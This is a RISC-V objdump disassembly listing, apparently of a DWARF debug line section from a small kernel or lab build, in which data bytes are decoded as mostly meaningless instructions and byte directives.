     820:	0501                	.2byte	0x501
     822:	0301                	.2byte	0x301
     824:	0901                	.2byte	0x901
     826:	0004                	.2byte	0x4
     828:	0301                	.2byte	0x301
     82a:	00140903          	lb	s2,1(s0)
     82e:	0501                	.2byte	0x501
     830:	030a                	.2byte	0x30a
     832:	00140903          	lb	s2,1(s0)
     836:	0501                	.2byte	0x501
     838:	09000303          	lb	t1,144(zero) # 90 <threadsense.2+0xc>
     83c:	0004                	.2byte	0x4
     83e:	0501                	.2byte	0x501
     840:	0314                	.2byte	0x314
     842:	0902                	.2byte	0x902
     844:	0004                	.2byte	0x4
     846:	0501                	.2byte	0x501
     848:	0321                	.2byte	0x321
     84a:	0900                	.2byte	0x900
     84c:	0010                	.2byte	0x10
     84e:	0501                	.2byte	0x501
     850:	0900031b          	addw	t1,zero,144
     854:	0008                	.2byte	0x8
     856:	0001                	.2byte	0x1
     858:	0402                	.2byte	0x402
     85a:	0601                	.2byte	0x601
     85c:	08090003          	lb	zero,128(s2)
     860:	0100                	.2byte	0x100
     862:	0200                	.2byte	0x200
     864:	0204                	.2byte	0x204
     866:	08090003          	lb	zero,128(s2)
     86a:	0100                	.2byte	0x100
     86c:	0b05                	.2byte	0xb05
     86e:	0200                	.2byte	0x200
     870:	0404                	.2byte	0x404
     872:	0306                	.2byte	0x306
     874:	0900                	.2byte	0x900
     876:	0004                	.2byte	0x4
     878:	0501                	.2byte	0x501
     87a:	0402001b          	addw	zero,tp,64 # 40 <buf.4>
     87e:	0304                	.2byte	0x304
     880:	0900                	.2byte	0x900
     882:	0010                	.2byte	0x10
     884:	0501                	.2byte	0x501
     886:	0402000f          	.4byte	0x402000f
     88a:	0304                	.2byte	0x304
     88c:	0900                	.2byte	0x900
     88e:	0008                	.2byte	0x8
     890:	0501                	.2byte	0x501
     892:	04020007          	.4byte	0x4020007
     896:	0304                	.2byte	0x304
     898:	0901                	.2byte	0x901
     89a:	000c                	.2byte	0xc
     89c:	0501                	.2byte	0x501
     89e:	0018                	.2byte	0x18
     8a0:	0402                	.2byte	0x402
     8a2:	0304                	.2byte	0x304
     8a4:	097d                	.2byte	0x97d
     8a6:	000c                	.2byte	0xc
     8a8:	0501                	.2byte	0x501
     8aa:	0011                	.2byte	0x11
     8ac:	0402                	.2byte	0x402
     8ae:	0302                	.2byte	0x302
     8b0:	0900                	.2byte	0x900
     8b2:	000c                	.2byte	0xc
     8b4:	0501                	.2byte	0x501
     8b6:	0905030b          	.4byte	0x905030b
     8ba:	0010                	.2byte	0x10
     8bc:	0501                	.2byte	0x501
     8be:	09020303          	lb	t1,144(tp) # 90 <threadsense.2+0xc>
     8c2:	0004                	.2byte	0x4
     8c4:	0501                	.2byte	0x501
     8c6:	0301                	.2byte	0x301
     8c8:	0901                	.2byte	0x901
     8ca:	000c                	.2byte	0xc
     8cc:	0301                	.2byte	0x301
     8ce:	0904                	.2byte	0x904
     8d0:	0014                	.2byte	0x14
     8d2:	0501                	.2byte	0x501
     8d4:	09020307          	.4byte	0x9020307
     8d8:	0040                	.2byte	0x40
     8da:	0501                	.2byte	0x501
     8dc:	09040317          	auipc	t1,0x9040
     8e0:	0004                	.2byte	0x4
     8e2:	0501                	.2byte	0x501
     8e4:	030d                	.2byte	0x30d
     8e6:	0900                	.2byte	0x900
     8e8:	000c                	.2byte	0xc
     8ea:	0501                	.2byte	0x501
     8ec:	0311                	.2byte	0x311
     8ee:	0900                	.2byte	0x900
     8f0:	000c                	.2byte	0xc
     8f2:	0501                	.2byte	0x501
     8f4:	030d                	.2byte	0x30d
     8f6:	0901                	.2byte	0x901
     8f8:	0014                	.2byte	0x14
     8fa:	0501                	.2byte	0x501
     8fc:	0308                	.2byte	0x308
     8fe:	0900                	.2byte	0x900
     900:	0004                	.2byte	0x4
     902:	0501                	.2byte	0x501
     904:	0309                	.2byte	0x309
     906:	0902                	.2byte	0x902
     908:	0008                	.2byte	0x8
     90a:	0501                	.2byte	0x501
     90c:	0311                	.2byte	0x311
     90e:	097d                	.2byte	0x97d
     910:	0010                	.2byte	0x10
     912:	0501                	.2byte	0x501
     914:	09020307          	.4byte	0x9020307
     918:	0004                	.2byte	0x4
     91a:	0501                	.2byte	0x501
     91c:	0309                	.2byte	0x309
     91e:	0904                	.2byte	0x904
     920:	0004                	.2byte	0x4
     922:	0501                	.2byte	0x501
     924:	0305                	.2byte	0x305
     926:	0901                	.2byte	0x901
     928:	0004                	.2byte	0x4
     92a:	0501                	.2byte	0x501
     92c:	097f030f          	.4byte	0x97f030f
     930:	0014                	.2byte	0x14
     932:	0501                	.2byte	0x501
     934:	0312                	.2byte	0x312
     936:	0900                	.2byte	0x900
     938:	000c                	.2byte	0xc
     93a:	0501                	.2byte	0x501
     93c:	0309                	.2byte	0x309
     93e:	000c0903          	lb	s2,0(s8)
     942:	0501                	.2byte	0x501
     944:	0901030f          	.4byte	0x901030f
     948:	0004                	.2byte	0x4
     94a:	0501                	.2byte	0x501
     94c:	031c                	.2byte	0x31c
     94e:	0900                	.2byte	0x900
     950:	0014                	.2byte	0x14
     952:	0501                	.2byte	0x501
     954:	09000333          	.4byte	0x9000333
     958:	0014                	.2byte	0x14
     95a:	0001                	.2byte	0x1
     95c:	0402                	.2byte	0x402
     95e:	0601                	.2byte	0x601
     960:	0c090003          	lb	zero,192(s2)
     964:	0100                	.2byte	0x100
     966:	0200                	.2byte	0x200
     968:	0204                	.2byte	0x204
     96a:	08090003          	lb	zero,128(s2)
     96e:	0100                	.2byte	0x100
     970:	1505                	.2byte	0x1505
     972:	0200                	.2byte	0x200
     974:	0404                	.2byte	0x404
     976:	0306                	.2byte	0x306
     978:	0900                	.2byte	0x900
     97a:	0004                	.2byte	0x4
     97c:	0501                	.2byte	0x501
     97e:	0005                	.2byte	0x5
     980:	0402                	.2byte	0x402
     982:	0304                	.2byte	0x304
     984:	0900                	.2byte	0x900
     986:	0008                	.2byte	0x8
     988:	0501                	.2byte	0x501
     98a:	030d                	.2byte	0x30d
     98c:	097f 0014 0501 0310 	.byte	0x7f, 0x09, 0x14, 0x00, 0x01, 0x05, 0x10, 0x03, 0x00, 0x09
     994:	0900 
     996:	000c                	.2byte	0xc
     998:	0501                	.2byte	0x501
     99a:	0301                	.2byte	0x301
     99c:	0902                	.2byte	0x902
     99e:	0004                	.2byte	0x4
     9a0:	0301                	.2byte	0x301
     9a2:	00180903          	lb	s2,1(a6)
     9a6:	0501                	.2byte	0x501
     9a8:	0306                	.2byte	0x306
     9aa:	0901                	.2byte	0x901
     9ac:	0018                	.2byte	0x18
     9ae:	0501                	.2byte	0x501
     9b0:	030c                	.2byte	0x30c
     9b2:	0901                	.2byte	0x901
     9b4:	0010                	.2byte	0x10
     9b6:	0501                	.2byte	0x501
     9b8:	0901030b          	.4byte	0x901030b
     9bc:	001c                	.2byte	0x1c
     9be:	0501                	.2byte	0x501
     9c0:	030c                	.2byte	0x30c
     9c2:	0901                	.2byte	0x901
     9c4:	000c                	.2byte	0xc
     9c6:	0301                	.2byte	0x301
     9c8:	0902                	.2byte	0x902
     9ca:	001c                	.2byte	0x1c
     9cc:	0501                	.2byte	0x501
     9ce:	0301                	.2byte	0x301
     9d0:	0901                	.2byte	0x901
     9d2:	0020                	.2byte	0x20
     9d4:	0301                	.2byte	0x301
     9d6:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     9da:	0501                	.2byte	0x501
     9dc:	0306                	.2byte	0x306
     9de:	0901                	.2byte	0x901
     9e0:	0018                	.2byte	0x18
     9e2:	0501                	.2byte	0x501
     9e4:	030c                	.2byte	0x30c
     9e6:	0901                	.2byte	0x901
     9e8:	0010                	.2byte	0x10
     9ea:	0501                	.2byte	0x501
     9ec:	0901030b          	.4byte	0x901030b
     9f0:	001c                	.2byte	0x1c
     9f2:	0501                	.2byte	0x501
     9f4:	030c                	.2byte	0x30c
     9f6:	0901                	.2byte	0x901
     9f8:	000c                	.2byte	0xc
     9fa:	0301                	.2byte	0x301
     9fc:	0902                	.2byte	0x902
     9fe:	001c                	.2byte	0x1c
     a00:	0501                	.2byte	0x501
     a02:	0301                	.2byte	0x301
     a04:	0901                	.2byte	0x901
     a06:	0018                	.2byte	0x18
     a08:	0301                	.2byte	0x301
     a0a:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     a0e:	0501                	.2byte	0x501
     a10:	0909030b          	.4byte	0x909030b
     a14:	0028                	.2byte	0x28
     a16:	0501                	.2byte	0x501
     a18:	030a                	.2byte	0x30a
     a1a:	0901                	.2byte	0x901
     a1c:	0004                	.2byte	0x4
     a1e:	0301                	.2byte	0x301
     a20:	0902                	.2byte	0x902
     a22:	0004                	.2byte	0x4
     a24:	0501                	.2byte	0x501
     a26:	09010307          	.4byte	0x9010307
     a2a:	000c                	.2byte	0xc
     a2c:	0501                	.2byte	0x501
     a2e:	0312                	.2byte	0x312
     a30:	097c                	.2byte	0x97c
     a32:	0010                	.2byte	0x10
     a34:	0501                	.2byte	0x501
     a36:	0310                	.2byte	0x310
     a38:	0900                	.2byte	0x900
     a3a:	0008                	.2byte	0x8
     a3c:	0501                	.2byte	0x501
     a3e:	032a                	.2byte	0x32a
     a40:	0900                	.2byte	0x900
     a42:	0004                	.2byte	0x4
     a44:	0501                	.2byte	0x501
     a46:	0308                	.2byte	0x308
     a48:	0906                	.2byte	0x906
     a4a:	000c                	.2byte	0xc
     a4c:	0501                	.2byte	0x501
     a4e:	030e                	.2byte	0x30e
     a50:	000c0903          	lb	s2,0(s8)
     a54:	0501                	.2byte	0x501
     a56:	030a                	.2byte	0x30a
     a58:	0901                	.2byte	0x901
     a5a:	0008                	.2byte	0x8
     a5c:	0501                	.2byte	0x501
     a5e:	0901030b          	.4byte	0x901030b
     a62:	0008                	.2byte	0x8
     a64:	0501                	.2byte	0x501
     a66:	0901030f          	.4byte	0x901030f
     a6a:	0008                	.2byte	0x8
     a6c:	0501                	.2byte	0x501
     a6e:	0901030b          	.4byte	0x901030b
     a72:	0008                	.2byte	0x8
     a74:	0501                	.2byte	0x501
     a76:	030d                	.2byte	0x30d
     a78:	0901                	.2byte	0x901
     a7a:	0004                	.2byte	0x4
     a7c:	0501                	.2byte	0x501
     a7e:	09270307          	.4byte	0x9270307
     a82:	0008                	.2byte	0x8
     a84:	0301                	.2byte	0x301
     a86:	0909                	.2byte	0x909
     a88:	0008                	.2byte	0x8
     a8a:	0501                	.2byte	0x501
     a8c:	09520313          	add	t1,tp,149 # 95 <threadsense.2+0x11>
     a90:	0004                	.2byte	0x4
     a92:	0501                	.2byte	0x501
     a94:	0312                	.2byte	0x312
     a96:	0900                	.2byte	0x900
     a98:	000c                	.2byte	0xc
     a9a:	0501                	.2byte	0x501
     a9c:	0310                	.2byte	0x310
     a9e:	0900                	.2byte	0x900
     aa0:	0004                	.2byte	0x4
     aa2:	0501                	.2byte	0x501
     aa4:	0305                	.2byte	0x305
     aa6:	0900                	.2byte	0x900
     aa8:	0004                	.2byte	0x4
     aaa:	0501                	.2byte	0x501
     aac:	030c                	.2byte	0x30c
     aae:	0904                	.2byte	0x904
     ab0:	0040                	.2byte	0x40
     ab2:	0501                	.2byte	0x501
     ab4:	09010307          	.4byte	0x9010307
     ab8:	0008                	.2byte	0x8
     aba:	0501                	.2byte	0x501
     abc:	030c                	.2byte	0x30c
     abe:	0904                	.2byte	0x904
     ac0:	0004                	.2byte	0x4
     ac2:	0501                	.2byte	0x501
     ac4:	09010307          	.4byte	0x9010307
     ac8:	0008                	.2byte	0x8
     aca:	0501                	.2byte	0x501
     acc:	0316                	.2byte	0x316
     ace:	090c                	.2byte	0x90c
     ad0:	0004                	.2byte	0x4
     ad2:	0501                	.2byte	0x501
     ad4:	031f 0901 0004      	.byte	0x1f, 0x03, 0x01, 0x09, 0x04, 0x00
     ada:	0501                	.2byte	0x501
     adc:	0324                	.2byte	0x324
     ade:	0900                	.2byte	0x900
     ae0:	001c                	.2byte	0x1c
     ae2:	0501                	.2byte	0x501
     ae4:	09000313          	li	t1,144
     ae8:	0008                	.2byte	0x8
     aea:	0501                	.2byte	0x501
     aec:	030e                	.2byte	0x30e
     aee:	0901                	.2byte	0x901
     af0:	0008                	.2byte	0x8
     af2:	0501                	.2byte	0x501
     af4:	030c                	.2byte	0x30c
     af6:	0900                	.2byte	0x900
     af8:	0008                	.2byte	0x8
     afa:	0301                	.2byte	0x301
     afc:	0901                	.2byte	0x901
     afe:	0004                	.2byte	0x4
     b00:	0501                	.2byte	0x501
     b02:	0016                	.2byte	0x16
     b04:	0402                	.2byte	0x402
     b06:	0301                	.2byte	0x301
     b08:	0900                	.2byte	0x900
     b0a:	000c                	.2byte	0xc
     b0c:	0501                	.2byte	0x501
     b0e:	031d                	.2byte	0x31d
     b10:	097d                	.2byte	0x97d
     b12:	000c                	.2byte	0xc
     b14:	0501                	.2byte	0x501
     b16:	09010313          	add	t1,sp,144
     b1a:	000c                	.2byte	0xc
     b1c:	0501                	.2byte	0x501
     b1e:	0311                	.2byte	0x311
     b20:	0908                	.2byte	0x908
     b22:	0004                	.2byte	0x4
     b24:	0501                	.2byte	0x501
     b26:	09010307          	.4byte	0x9010307
     b2a:	0014                	.2byte	0x14
     b2c:	0501                	.2byte	0x501
     b2e:	030a                	.2byte	0x30a
     b30:	00040903          	lb	s2,0(s0)
     b34:	0501                	.2byte	0x501
     b36:	0901030f          	.4byte	0x901030f
     b3a:	000c                	.2byte	0xc
     b3c:	0501                	.2byte	0x501
     b3e:	09010307          	.4byte	0x9010307
     b42:	0004                	.2byte	0x4
     b44:	0501                	.2byte	0x501
     b46:	0903030f          	.4byte	0x903030f
     b4a:	0004                	.2byte	0x4
     b4c:	0501                	.2byte	0x501
     b4e:	09010307          	.4byte	0x9010307
     b52:	0008                	.2byte	0x8
     b54:	0301                	.2byte	0x301
     b56:	00040973          	.4byte	0x40973
     b5a:	0501                	.2byte	0x501
     b5c:	030a                	.2byte	0x30a
     b5e:	0910                	.2byte	0x910
     b60:	0004                	.2byte	0x4
     b62:	0501                	.2byte	0x501
     b64:	0901030f          	.4byte	0x901030f
     b68:	000c                	.2byte	0xc
     b6a:	0501                	.2byte	0x501
     b6c:	0326                	.2byte	0x326
     b6e:	0900                	.2byte	0x900
     b70:	0008                	.2byte	0x8
     b72:	0501                	.2byte	0x501
     b74:	09010307          	.4byte	0x9010307
     b78:	0008                	.2byte	0x8
     b7a:	0501                	.2byte	0x501
     b7c:	030c                	.2byte	0x30c
     b7e:	0904                	.2byte	0x904
     b80:	0004                	.2byte	0x4
     b82:	0501                	.2byte	0x501
     b84:	09010307          	.4byte	0x9010307
     b88:	000c                	.2byte	0xc
     b8a:	0301                	.2byte	0x301
     b8c:	0904                	.2byte	0x904
     b8e:	0004                	.2byte	0x4
     b90:	0301                	.2byte	0x301
     b92:	0901                	.2byte	0x901
     b94:	0020                	.2byte	0x20
     b96:	0501                	.2byte	0x501
     b98:	030e                	.2byte	0x30e
     b9a:	0904                	.2byte	0x904
     b9c:	0004                	.2byte	0x4
     b9e:	0501                	.2byte	0x501
     ba0:	030a                	.2byte	0x30a
     ba2:	0900                	.2byte	0x900
     ba4:	0010                	.2byte	0x10
     ba6:	0501                	.2byte	0x501
     ba8:	0901030b          	.4byte	0x901030b
     bac:	0004                	.2byte	0x4
     bae:	0501                	.2byte	0x501
     bb0:	030a                	.2byte	0x30a
     bb2:	0901                	.2byte	0x901
     bb4:	0008                	.2byte	0x8
     bb6:	0501                	.2byte	0x501
     bb8:	0015                	.2byte	0x15
     bba:	0402                	.2byte	0x402
     bbc:	0301                	.2byte	0x301
     bbe:	0900                	.2byte	0x900
     bc0:	000c                	.2byte	0xc
     bc2:	0501                	.2byte	0x501
     bc4:	0314                	.2byte	0x314
     bc6:	0901                	.2byte	0x901
     bc8:	0010                	.2byte	0x10
     bca:	0501                	.2byte	0x501
     bcc:	09000317          	auipc	t1,0x9000
     bd0:	0004                	.2byte	0x4
     bd2:	0501                	.2byte	0x501
     bd4:	0314                	.2byte	0x314
     bd6:	0900                	.2byte	0x900
     bd8:	0014                	.2byte	0x14
     bda:	0501                	.2byte	0x501
     bdc:	0309                	.2byte	0x309
     bde:	0900                	.2byte	0x900
     be0:	0010                	.2byte	0x10
     be2:	0501                	.2byte	0x501
     be4:	0402000b          	.4byte	0x402000b
     be8:	09010303          	lb	t1,144(sp)
     bec:	0004                	.2byte	0x4
     bee:	0501                	.2byte	0x501
     bf0:	003e                	.2byte	0x3e
     bf2:	0402                	.2byte	0x402
     bf4:	097f0303          	lb	t1,151(t5)
     bf8:	0018                	.2byte	0x18
     bfa:	0501                	.2byte	0x501
     bfc:	0034                	.2byte	0x34
     bfe:	0402                	.2byte	0x402
     c00:	0301                	.2byte	0x301
     c02:	0900                	.2byte	0x900
     c04:	000c                	.2byte	0xc
     c06:	0501                	.2byte	0x501
     c08:	09020307          	.4byte	0x9020307
     c0c:	000c                	.2byte	0xc
     c0e:	0501                	.2byte	0x501
     c10:	0009                	.2byte	0x9
     c12:	0402                	.2byte	0x402
     c14:	0305                	.2byte	0x305
     c16:	0901                	.2byte	0x901
     c18:	0004                	.2byte	0x4
     c1a:	0501                	.2byte	0x501
     c1c:	000a                	.2byte	0xa
     c1e:	0402                	.2byte	0x402
     c20:	0305                	.2byte	0x305
     c22:	0901                	.2byte	0x901
     c24:	0010                	.2byte	0x10
     c26:	0501                	.2byte	0x501
     c28:	004d                	.2byte	0x4d
     c2a:	0402                	.2byte	0x402
     c2c:	0305                	.2byte	0x305
     c2e:	097e                	.2byte	0x97e
     c30:	0004                	.2byte	0x4
     c32:	0501                	.2byte	0x501
     c34:	0014                	.2byte	0x14
     c36:	0402                	.2byte	0x402
     c38:	0301                	.2byte	0x301
     c3a:	0900                	.2byte	0x900
     c3c:	000c                	.2byte	0xc
     c3e:	0501                	.2byte	0x501
     c40:	0012                	.2byte	0x12
     c42:	0402                	.2byte	0x402
     c44:	0301                	.2byte	0x301
     c46:	0900                	.2byte	0x900
     c48:	0004                	.2byte	0x4
     c4a:	0501                	.2byte	0x501
     c4c:	0020                	.2byte	0x20
     c4e:	0402                	.2byte	0x402
     c50:	0301                	.2byte	0x301
     c52:	0900                	.2byte	0x900
     c54:	0004                	.2byte	0x4
     c56:	0001                	.2byte	0x1
     c58:	0402                	.2byte	0x402
     c5a:	0602                	.2byte	0x602
     c5c:	04090003          	lb	zero,64(s2)
     c60:	0100                	.2byte	0x100
     c62:	3205                	.2byte	0x3205
     c64:	0200                	.2byte	0x200
     c66:	0404                	.2byte	0x404
     c68:	0306                	.2byte	0x306
     c6a:	0900                	.2byte	0x900
     c6c:	000c                	.2byte	0xc
     c6e:	0501                	.2byte	0x501
     c70:	09040307          	.4byte	0x9040307
     c74:	0018                	.2byte	0x18
     c76:	0501                	.2byte	0x501
     c78:	0009                	.2byte	0x9
     c7a:	0402                	.2byte	0x402
     c7c:	0302                	.2byte	0x302
     c7e:	0901                	.2byte	0x901
     c80:	0004                	.2byte	0x4
     c82:	0501                	.2byte	0x501
     c84:	001e                	.2byte	0x1e
     c86:	0402                	.2byte	0x402
     c88:	0302                	.2byte	0x302
     c8a:	097f 0010 0501 0014 	.byte	0x7f, 0x09, 0x10, 0x00, 0x01, 0x05, 0x14, 0x00, 0x02, 0x04
     c92:	0402 
     c94:	0301                	.2byte	0x301
     c96:	0900                	.2byte	0x900
     c98:	000c                	.2byte	0xc
     c9a:	0501                	.2byte	0x501
     c9c:	09020307          	.4byte	0x9020307
     ca0:	000c                	.2byte	0xc
     ca2:	0501                	.2byte	0x501
     ca4:	030d                	.2byte	0x30d
     ca6:	0904                	.2byte	0x904
     ca8:	0004                	.2byte	0x4
     caa:	0501                	.2byte	0x501
     cac:	0900030b          	.4byte	0x900030b
     cb0:	0018                	.2byte	0x18
     cb2:	0301                	.2byte	0x301
     cb4:	0901                	.2byte	0x901
     cb6:	0004                	.2byte	0x4
     cb8:	0501                	.2byte	0x501
     cba:	030a                	.2byte	0x30a
     cbc:	0900                	.2byte	0x900
     cbe:	0004                	.2byte	0x4
     cc0:	0501                	.2byte	0x501
     cc2:	0309                	.2byte	0x309
     cc4:	0901                	.2byte	0x901
     cc6:	0004                	.2byte	0x4
     cc8:	0501                	.2byte	0x501
     cca:	0310                	.2byte	0x310
     ccc:	0901                	.2byte	0x901
     cce:	0010                	.2byte	0x10
     cd0:	0501                	.2byte	0x501
     cd2:	0900030f          	.4byte	0x900030f
     cd6:	0004                	.2byte	0x4
     cd8:	0501                	.2byte	0x501
     cda:	030d                	.2byte	0x30d
     cdc:	0900                	.2byte	0x900
     cde:	0004                	.2byte	0x4
     ce0:	0501                	.2byte	0x501
     ce2:	030c                	.2byte	0x30c
     ce4:	0902                	.2byte	0x902
     ce6:	0004                	.2byte	0x4
     ce8:	0501                	.2byte	0x501
     cea:	09010307          	.4byte	0x9010307
     cee:	0008                	.2byte	0x8
     cf0:	0501                	.2byte	0x501
     cf2:	030c                	.2byte	0x30c
     cf4:	0904                	.2byte	0x904
     cf6:	0004                	.2byte	0x4
     cf8:	0501                	.2byte	0x501
     cfa:	09010307          	.4byte	0x9010307
     cfe:	0008                	.2byte	0x8
     d00:	0501                	.2byte	0x501
     d02:	030c                	.2byte	0x30c
     d04:	0905                	.2byte	0x905
     d06:	0004                	.2byte	0x4
     d08:	0501                	.2byte	0x501
     d0a:	09010307          	.4byte	0x9010307
     d0e:	0008                	.2byte	0x8
     d10:	0501                	.2byte	0x501
     d12:	030d                	.2byte	0x30d
     d14:	0905                	.2byte	0x905
     d16:	0004                	.2byte	0x4
     d18:	0501                	.2byte	0x501
     d1a:	09010307          	.4byte	0x9010307
     d1e:	0008                	.2byte	0x8
     d20:	0301                	.2byte	0x301
     d22:	0901                	.2byte	0x901
     d24:	0010                	.2byte	0x10
     d26:	0501                	.2byte	0x501
     d28:	030c                	.2byte	0x30c
     d2a:	0905                	.2byte	0x905
     d2c:	0010                	.2byte	0x10
     d2e:	0501                	.2byte	0x501
     d30:	030d                	.2byte	0x30d
     d32:	0902                	.2byte	0x902
     d34:	0008                	.2byte	0x8
     d36:	0501                	.2byte	0x501
     d38:	09020307          	.4byte	0x9020307
     d3c:	0018                	.2byte	0x18
     d3e:	0301                	.2byte	0x301
     d40:	0901                	.2byte	0x901
     d42:	0020                	.2byte	0x20
     d44:	0301                	.2byte	0x301
     d46:	0904                	.2byte	0x904
     d48:	0004                	.2byte	0x4
     d4a:	0301                	.2byte	0x301
     d4c:	0901                	.2byte	0x901
     d4e:	0010                	.2byte	0x10
     d50:	0301                	.2byte	0x301
     d52:	0904                	.2byte	0x904
     d54:	0004                	.2byte	0x4
     d56:	0501                	.2byte	0x501
     d58:	0901030b          	.4byte	0x901030b
     d5c:	0010                	.2byte	0x10
     d5e:	0501                	.2byte	0x501
     d60:	09010307          	.4byte	0x9010307
     d64:	0008                	.2byte	0x8
     d66:	0501                	.2byte	0x501
     d68:	0402000b          	.4byte	0x402000b
     d6c:	0301                	.2byte	0x301
     d6e:	7ef8                	.2byte	0x7ef8
     d70:	0409                	.2byte	0x409
     d72:	0100                	.2byte	0x100
     d74:	0905                	.2byte	0x905
     d76:	04090203          	lb	tp,64(s2)
     d7a:	0100                	.2byte	0x100
     d7c:	0105                	.2byte	0x105
     d7e:	09018903          	lb	s2,144(gp)
     d82:	0004                	.2byte	0x4
     d84:	0301                	.2byte	0x301
     d86:	00180903          	lb	s2,1(a6)
     d8a:	0501                	.2byte	0x501
     d8c:	09020303          	lb	t1,144(tp) # 90 <threadsense.2+0xc>
     d90:	0030                	.2byte	0x30
     d92:	0301                	.2byte	0x301
     d94:	0902                	.2byte	0x902
     d96:	0014                	.2byte	0x14
     d98:	0501                	.2byte	0x501
     d9a:	030a                	.2byte	0x30a
     d9c:	001c0903          	lb	s2,1(s8)
     da0:	0501                	.2byte	0x501
     da2:	0301                	.2byte	0x301
     da4:	0901                	.2byte	0x901
     da6:	0004                	.2byte	0x4
     da8:	0501                	.2byte	0x501
     daa:	09090303          	lb	t1,144(s2)
     dae:	0014                	.2byte	0x14
     db0:	0501                	.2byte	0x501
     db2:	030c                	.2byte	0x30c
     db4:	0901                	.2byte	0x901
     db6:	001c                	.2byte	0x1c
     db8:	0501                	.2byte	0x501
     dba:	0306                	.2byte	0x306
     dbc:	0901                	.2byte	0x901
     dbe:	0008                	.2byte	0x8
     dc0:	0501                	.2byte	0x501
     dc2:	030c                	.2byte	0x30c
     dc4:	0900                	.2byte	0x900
     dc6:	0008                	.2byte	0x8
     dc8:	0501                	.2byte	0x501
     dca:	0306                	.2byte	0x306
     dcc:	0901                	.2byte	0x901
     dce:	000c                	.2byte	0xc
     dd0:	0501                	.2byte	0x501
     dd2:	030c                	.2byte	0x30c
     dd4:	0900                	.2byte	0x900
     dd6:	0008                	.2byte	0x8
     dd8:	0501                	.2byte	0x501
     dda:	09010303          	lb	t1,144(sp)
     dde:	000c                	.2byte	0xc
     de0:	0501                	.2byte	0x501
     de2:	0301                	.2byte	0x301
     de4:	0976                	.2byte	0x976
     de6:	0010                	.2byte	0x10
     de8:	0401                	.2byte	0x401
     dea:	03050503          	lb	a0,48(a0)
     dee:	7fbc                	.2byte	0x7fbc
     df0:	3009                	.2byte	0x3009
     df2:	0100                	.2byte	0x100
     df4:	0204                	.2byte	0x204
     df6:	0905                	.2byte	0x905
     df8:	0900c603          	lbu	a2,144(ra)
     dfc:	0058                	.2byte	0x58
     dfe:	0501                	.2byte	0x501
     e00:	09010303          	lb	t1,144(sp)
     e04:	0008                	.2byte	0x8
     e06:	0301                	.2byte	0x301
     e08:	0909                	.2byte	0x909
     e0a:	0014                	.2byte	0x14
     e0c:	0301                	.2byte	0x301
     e0e:	0901                	.2byte	0x901
     e10:	0020                	.2byte	0x20
     e12:	0501                	.2byte	0x501
     e14:	0308                	.2byte	0x308
     e16:	0900                	.2byte	0x900
     e18:	0004                	.2byte	0x4
     e1a:	0501                	.2byte	0x501
     e1c:	030e                	.2byte	0x30e
     e1e:	00040903          	lb	s2,0(s0)
     e22:	0501                	.2byte	0x501
     e24:	0301                	.2byte	0x301
     e26:	0901                	.2byte	0x901
     e28:	0010                	.2byte	0x10
     e2a:	0301                	.2byte	0x301
     e2c:	00140903          	lb	s2,1(s0)
     e30:	0501                	.2byte	0x501
     e32:	0309                	.2byte	0x309
     e34:	0901                	.2byte	0x901
     e36:	0018                	.2byte	0x18
     e38:	0501                	.2byte	0x501
     e3a:	0900031b          	addw	t1,zero,144
     e3e:	0004                	.2byte	0x4
     e40:	0501                	.2byte	0x501
     e42:	0319                	.2byte	0x319
     e44:	0900                	.2byte	0x900
     e46:	0004                	.2byte	0x4
     e48:	0501                	.2byte	0x501
     e4a:	032a                	.2byte	0x32a
     e4c:	0900                	.2byte	0x900
     e4e:	0004                	.2byte	0x4
     e50:	0501                	.2byte	0x501
     e52:	0331                	.2byte	0x331
     e54:	0900                	.2byte	0x900
     e56:	0008                	.2byte	0x8
     e58:	0501                	.2byte	0x501
     e5a:	0306                	.2byte	0x306
     e5c:	0900                	.2byte	0x900
     e5e:	0004                	.2byte	0x4
     e60:	0501                	.2byte	0x501
     e62:	0316                	.2byte	0x316
     e64:	0901                	.2byte	0x901
     e66:	0004                	.2byte	0x4
     e68:	0501                	.2byte	0x501
     e6a:	0310                	.2byte	0x310
     e6c:	0901                	.2byte	0x901
     e6e:	0008                	.2byte	0x8
     e70:	0501                	.2byte	0x501
     e72:	0901030b          	.4byte	0x901030b
     e76:	0008                	.2byte	0x8
     e78:	0501                	.2byte	0x501
     e7a:	0310                	.2byte	0x310
     e7c:	0901                	.2byte	0x901
     e7e:	0004                	.2byte	0x4
     e80:	0501                	.2byte	0x501
     e82:	0309                	.2byte	0x309
     e84:	0900                	.2byte	0x900
     e86:	000c                	.2byte	0xc
     e88:	0501                	.2byte	0x501
     e8a:	030e                	.2byte	0x30e
     e8c:	0900                	.2byte	0x900
     e8e:	000c                	.2byte	0xc
     e90:	0501                	.2byte	0x501
     e92:	030c                	.2byte	0x30c
     e94:	0900                	.2byte	0x900
     e96:	0004                	.2byte	0x4
     e98:	0501                	.2byte	0x501
     e9a:	0322                	.2byte	0x322
     e9c:	097f 0004 0501 030e 	.byte	0x7f, 0x09, 0x04, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     ea4:	0900 
     ea6:	000c                	.2byte	0xc
     ea8:	0501                	.2byte	0x501
     eaa:	0311                	.2byte	0x311
     eac:	000c0903          	lb	s2,0(s8)
     eb0:	0501                	.2byte	0x501
     eb2:	0901030b          	.4byte	0x901030b
     eb6:	0008                	.2byte	0x8
     eb8:	0301                	.2byte	0x301
     eba:	0901                	.2byte	0x901
     ebc:	0008                	.2byte	0x8
     ebe:	0501                	.2byte	0x501
     ec0:	0310                	.2byte	0x310
     ec2:	0901                	.2byte	0x901
     ec4:	0004                	.2byte	0x4
     ec6:	0501                	.2byte	0x501
     ec8:	0309                	.2byte	0x309
     eca:	0900                	.2byte	0x900
     ecc:	000c                	.2byte	0xc
     ece:	0501                	.2byte	0x501
     ed0:	030e                	.2byte	0x30e
     ed2:	0900                	.2byte	0x900
     ed4:	000c                	.2byte	0xc
     ed6:	0501                	.2byte	0x501
     ed8:	030c                	.2byte	0x30c
     eda:	0900                	.2byte	0x900
     edc:	0004                	.2byte	0x4
     ede:	0501                	.2byte	0x501
     ee0:	031d                	.2byte	0x31d
     ee2:	097f 0004 0501 030e 	.byte	0x7f, 0x09, 0x04, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     eea:	0900 
     eec:	000c                	.2byte	0xc
     eee:	0501                	.2byte	0x501
     ef0:	030a                	.2byte	0x30a
     ef2:	00080903          	lb	s2,0(a6)
     ef6:	0501                	.2byte	0x501
